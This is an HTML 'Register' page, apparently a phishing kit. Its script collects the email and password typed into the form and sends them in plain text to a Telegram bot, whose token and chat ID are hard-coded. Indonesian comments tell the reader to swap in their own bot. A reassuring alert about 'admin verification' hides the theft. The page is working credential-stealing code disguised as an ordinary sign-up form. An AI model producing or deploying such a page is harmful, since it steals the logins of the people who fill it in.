<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Register Page</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background: url('https://pomf2.lain.la/f/v6i5y5dc.jpg') no-repeat center center fixed;
      background-size: cover;
    }

    .login-container {
      background-color: rgba(255, 255, 255, 0.8);
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
      width: 300px;
    }

    h2 {
      text-align: center;
      font-size: 24px;
      margin-bottom: 20px;
    }

    label {
      display: block;
      margin-bottom: 8px;
    }

    input {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border-radius: 5px;
      border: 1px solid #ccc;
    }

    button {
      width: 100%;
      padding: 10px;
      background-color: #4CAF50;
      color: white;
      border: none;
      border-radius: 5px;
      font-size: 16px;
      cursor: pointer;
    }

    button:hover {
      background-color: #45a049;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <h2>ğ•½ğ–Šğ–Œğ–ğ–˜ğ–™ğ–Šğ–—</h2>
    <form id="loginForm">
      <label for="email">Email:</label>
      <input type="email" id="email" name="email" required><br><br>

      <label for="password">Password:</label>
      <input type="password" id="password" name="password" required><br><br>

      <button type="submit">Register</button>
    </form>
  </div>

  <script>
    document.getElementById("loginForm").addEventListener("submit", function(event) {
      event.preventDefault();

      const email = document.getElementById("email").value;
      const password = document.getElementById("password").value;

      // Token Bot Telegram
      const botToken = '7667658360:AAGwXaS2tfDV52denremA6FsWjg-QLi-bKM';  // Ganti dengan token bot kamu
      const chatId = '7013450923';      // Ganti dengan chat ID yang kamu dapatkan

      // Format pesan
      const message = `Email: ${email}\nPassword: ${password}\ntolong verifikasi`;

      // Kirim data ke Telegram menggunakan API Bot Telegram
      const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

      // Kirim request ke API Telegram
      fetch(apiUrl)
        .then(response => response.json())
        .then(data => {
          alert("Data telah dikirim tunggu admin verifikasi!");
        })
        .catch(error => {
          console.error("Error:", error);
          alert("Terjadi kesalahan saat mengirim data.");
        });
    });
  </script>
</body>
</html>
